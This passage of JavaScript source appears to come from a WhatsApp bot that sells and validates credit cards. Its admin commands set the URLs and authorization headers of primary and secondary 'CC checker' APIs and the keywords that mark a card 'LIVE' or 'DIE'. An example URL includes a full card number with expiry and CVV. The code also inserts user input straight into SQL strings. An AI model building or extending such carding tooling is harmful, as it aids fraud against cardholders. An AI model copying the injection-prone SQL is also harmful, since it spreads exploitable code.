                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/apichksec===") > -1 && Adms.includes(Numero)) {
            FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
            if (FILA_DE_CC_A_CHECAR.length > 0) {
                Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            if (Mensagem_Texto.indexOf("infocc") > -1) {

            } else {
                Texto = `*FALTOU COLOCAR A PALAVRA* infocc *NA URL CHK!*

*Exemplo:*

https://api/lista=5309940904998790|04|29|429

Ficaria assim:

/apichksec===https://api/lista=infocc

(Basta colocar infocc no lugar onde fica a cc para checar.)`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            try {
                msg = Mensagem_Texto.split("===")
                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE_SECUNDARIO'`).get()["VALOR"]

                API_CHK_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'API_CHK_SECUNDARIO'`).get()["VALOR"]
                API_CHK = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${API_CHK}' WHERE PARAMETRO = 'API_CHK_SECUNDARIO'`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'HEADER_AUTORIZATION_SECUNDARIO'`).run()

                Texto = `*URL DE CHECKER SECUNDÁRIA ALTERADA COM SUCESSO!*

*ANTES:* ${API_CHK_Ant}

*AGORA:* ${API_CHK}

*PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}

━━━━━━━━━━━━━━━━━━━━
*OBS:* Caso tenha configurado algum header authorization da API, acabei de remover... se precisar configure com o comando abaixo:

/headauthchksec===[CÓDIGO]

/headauthchksec===Fulano123456789
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/headauthchkpri===") > -1 && Adms.includes(Numero)) {
            FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
            if (FILA_DE_CC_A_CHECAR.length > 0) {
                Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            try {
                msg = Mensagem_Texto.split("===")
                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE'`).get()["VALOR"]
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE'`).get()["VALOR"]
                API_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'API_CHK'`).get()["VALOR"]

                HEADER_AUTORIZATION_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HEADER_AUTORIZATION'`).get()["VALOR"]
                HEADER_AUTORIZATION = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${HEADER_AUTORIZATION}' WHERE PARAMETRO = 'HEADER_AUTORIZATION'`).run()

                Texto = `*HEADER AUTORIZATION DA API CHECKER PRIMÁRIA ALTERADA COM SUCESSO!*

*ANTES:* ${HEADER_AUTORIZATION_Ant}

*AGORA:* ${HEADER_AUTORIZATION}

*API:* ${API_CHK}

*PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/headauthchksec===") > -1 && Adms.includes(Numero)) {
            FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
            if (FILA_DE_CC_A_CHECAR.length > 0) {
                Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            try {
                msg = Mensagem_Texto.split("===")
                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE_SECUNDARIO'`).get()["VALOR"]
                API_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'API_CHK_SECUNDARIO'`).get()["VALOR"]

                HEADER_AUTORIZATION_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HEADER_AUTORIZATION_SECUNDARIO'`).get()["VALOR"]
                HEADER_AUTORIZATION = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${HEADER_AUTORIZATION}' WHERE PARAMETRO = 'HEADER_AUTORIZATION_SECUNDARIO'`).run()

                Texto = `*HEADER AUTORIZATION DA API CHECKER SECUNDÁRIA ALTERADA COM SUCESSO!*

*ANTES:* ${HEADER_AUTORIZATION_Ant}

*AGORA:* ${HEADER_AUTORIZATION}

*API:* ${API_CHK}

*PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/palavralivepri1===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
                if (FILA_DE_CC_A_CHECAR.length > 0) {
                    Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE'`).get()["VALOR"]
                CHK_PALAVRA_DIE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2'`).get()["VALOR"]
                CHK_PALAVRA_LIVE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2'`).get()["VALOR"]

                CHK_PALAVRA_LIVE_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE'`).get()["VALOR"]
                CHK_PALAVRA_LIVE = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${CHK_PALAVRA_LIVE}' WHERE PARAMETRO = 'CHK_PALAVRA_LIVE'`).run()

                Texto = `*PRIMEIRA PALAVRA A DETECTAR, CASO DÊ LIVE, FOI ALTERADA! (API PRIMÁRIA)*

*1º PALAVRA AO RETORNAR LIVE*

*ANTES:* ${CHK_PALAVRA_LIVE_Ant} 🔄
*AGORA:* ${CHK_PALAVRA_LIVE} ✅

────────────────


*PALAVRAS QUANDO LIVE* ✅

*1º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*2º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE2}


*PALAVRAS QUANDO DIE* ❌

*1º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
*2º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE2}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
